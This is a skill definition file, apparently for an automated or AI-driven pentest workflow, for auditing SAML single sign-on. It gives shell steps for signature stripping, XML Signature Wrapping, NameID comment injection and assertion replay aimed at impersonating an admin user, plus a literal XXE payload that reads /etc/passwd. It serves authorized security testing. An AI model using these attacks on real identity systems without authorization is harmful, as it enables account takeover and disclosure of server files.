---
name: web-vuln-saml-sso
description: SAML and SSO vulnerability detection including XML Signature Wrapping attacks
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects vulnerabilities in SAML-based Single Sign-On implementations by intercepting and manipulating SAML responses. Tests for XML Signature Wrapping (XSW variants XSW1–XSW8), signature removal/stripping, NameID comment injection, SAML replay attacks, XXE in SAML responses, and Assertion Consumer Service (ACS) URL manipulation.

## When to use

- When auditing a web application that uses SAML 2.0 for authentication or federation
- When testing an Identity Provider (IdP) or Service Provider (SP) for SSO weaknesses
- When evaluating whether SAML signature validation can be bypassed to authenticate as an arbitrary user
- When checking for XML-level injection or replay vulnerabilities in SSO flows

## Prerequisites

- `curl` must be installed
- `base64` (GNU coreutils) must be available
- `xmllint` (from `libxml2-utils`) must be installed for XML parsing: `apt install libxml2-utils`
- Ability to intercept and replay SAML responses (browser proxy or captured assertion)
- A valid SAML response from a legitimate authentication flow

## Inputs

| Variable | Description | Example |
|----------|-------------|---------|
| `ACS_URL` | Assertion Consumer Service URL (SP endpoint that receives SAML response) | `https://sp.example.com/saml/acs` |
| `SAML_RESPONSE_B64` | Base64-encoded SAML response captured from a valid login | `PHNhbWxwOl...` |
| `TARGET_USER` | Username/email to impersonate in tests | `admin@example.com` |
| `LEGITIMATE_USER` | Username of the account used to obtain the real assertion | `user@example.com` |

## Workflow

### Step 1: Identify SAML endpoints and decode the response

```bash
ACS_URL="https://sp.example.com/saml/acs"
SAML_RESPONSE_B64="PHNhbWxwOl..."
TARGET_USER="admin@example.com"
LEGITIMATE_USER="user@example.com"

WORK_DIR=$(mktemp -d /tmp/saml_test_XXXXXX)
echo "[+] Working directory: $WORK_DIR"

# Decode and pretty-print the SAML response
echo "$SAML_RESPONSE_B64" | base64 -d > "$WORK_DIR/saml_original.xml"
xmllint --format "$WORK_DIR/saml_original.xml" > "$WORK_DIR/saml_pretty.xml" 2>/dev/null \
  || cp "$WORK_DIR/saml_original.xml" "$WORK_DIR/saml_pretty.xml"

echo "=== Step 1: SAML response structure ==="
grep -E "<(saml:|samlp:)?(Issuer|NameID|Conditions|AudienceRestriction|Audience|AuthnStatement|AttributeStatement|Signature)" \
  "$WORK_DIR/saml_pretty.xml" | head -20

echo ""
echo "[+] NameID value:"
grep -oP '(?<=<saml:NameID[^>]*>)[^<]+' "$WORK_DIR/saml_pretty.xml" | head -3
```

### Step 2: Test signature removal (signature stripping)

> **Reference**: See [REFERENCE.md](REFERENCE.md) for the full signature stripping Python script.

```bash
echo ""
echo "=== Step 2: Signature stripping ==="
python3 strip_sig.py "$WORK_DIR/saml_original.xml" "$TARGET_USER"

echo "[+] Sending signature-stripped response to ACS..."
curl -s -X POST "$ACS_URL" \
  --data-urlencode "SAMLResponse@/tmp/saml_stripped_b64.txt" \
  --max-time 15 \
  -c "$WORK_DIR/cookies_stripped.txt" \
  -D "$WORK_DIR/headers_stripped.txt" \
  -o "$WORK_DIR/resp_stripped.html" \
  -L

grep -iE "^(HTTP|Location|Set-Cookie)" "$WORK_DIR/headers_stripped.txt" | head -10
echo "[!] If authenticated session cookie set for $TARGET_USER -> signature validation BYPASSED"
```

### Step 3: Test XML Signature Wrapping (XSW variants)

> **Reference**: See [REFERENCE.md](REFERENCE.md) for the full XSW testing Python script covering XSW1 and XSW2 variants.

```bash
echo ""
echo "=== Step 3: XSW variants ==="
python3 xsw_test.py "$WORK_DIR/saml_original.xml" "$TARGET_USER" "$ACS_URL" "$WORK_DIR"
# [Note] Full XSW1-XSW8 testing is best performed with SAMLRaider (Burp extension)
# Reference: https://github.com/SAMLRaider/SAMLRaider
```

### Step 4: Test NameID comment injection

> **Reference**: See [REFERENCE.md](REFERENCE.md) for the full comment injection Python script.

```bash
echo ""
echo "=== Step 4: NameID comment injection ==="
python3 comment_inject.py "$WORK_DIR/saml_original.xml" "$TARGET_USER" "$LEGITIMATE_USER" "$ACS_URL"
echo "[!] If session opened for target user -> comment injection bypasses SP NameID parsing"
```

### Step 5: Test SAML replay

```bash
echo ""
echo "=== Step 5: SAML replay ==="
echo "[+] Replaying the original (valid) SAML response a second time..."

curl -s -X POST "$ACS_URL" \
  --data-urlencode "SAMLResponse=$SAML_RESPONSE_B64" \
  --max-time 15 \
  -D "$WORK_DIR/headers_replay.txt" \
  -o "$WORK_DIR/resp_replay.html" \
  -L

echo "[Response headers]:"
grep -iE "^(HTTP|Location|Set-Cookie)" "$WORK_DIR/headers_replay.txt" | head -10
echo "[!] If new session created -> SP does not enforce one-time use of assertions (no NotOnOrAfter or InResponseTo check)"
```

### Step 6: Test XXE in SAML response

> **Reference**: See [REFERENCE.md](REFERENCE.md) for the full XXE injection Python script.

```bash
echo ""
echo "=== Step 6: XXE in SAML response ==="
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
python3 xxe_inject.py "$WORK_DIR/saml_original.xml" "$ACS_URL" "$XXE_PAYLOAD"
# [Note] XXE may be out-of-band; check Burp Collaborator / SSRF canary if no inline output
```

### Step 7: Document findings

> **Reference**: See [REFERENCE.md](REFERENCE.md) for the full severity guide (CRITICAL/HIGH/MEDIUM/LOW) and complete remediation checklist.

```bash
echo "=== Step 7: Summary ==="
echo "Tools:"
echo "  SAMLRaider (Burp Extension): https://github.com/SAMLRaider/SAMLRaider"
echo "  PortSwigger SAML lab: https://portswigger.net/web-security/saml"
```

## Done when

- SAML response is decoded and structure is inspected
- Signature stripping is attempted and SP response is evaluated
- At least 2 XSW variants are tested
- NameID comment injection is attempted
- SAML replay is tested
- XXE DOCTYPE injection is attempted
- Findings are classified by severity with remediation notes

## Failure modes

| Symptom | Cause | Solution |
|---------|-------|----------|
| ACS returns 400 immediately | SP validates XML schema before signature | Use `xmllint --noout` to verify XML is well-formed before sending |
| All modified assertions return generic error | SP has strict signature validation (good) | Confirm with XSW variants that require valid signature block to remain |
| `base64 -d` fails | SAML response may be URL-encoded | Run `python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))"` first |
| `xmllint` not found | libxml2-utils not installed | `sudo apt install libxml2-utils` |
| Replay test always rejected | SP enforces NotOnOrAfter and InResponseTo | This is correct behavior; document as pass |

## Notes

- SAML responses are typically URL-encoded when captured from browser traffic; decode with `urllib.parse.unquote()` before base64 decoding.
- XSW attacks depend on the XPath expression the SP uses to extract the signed element; XSW1–XSW8 cover common XPath patterns.
- The SAMLRaider Burp extension automates all 8 XSW variants interactively and is the recommended tool for thorough testing.
- Never test against a production IdP/SP without explicit written authorization; replaying assertions may trigger account lockouts or audit alerts.
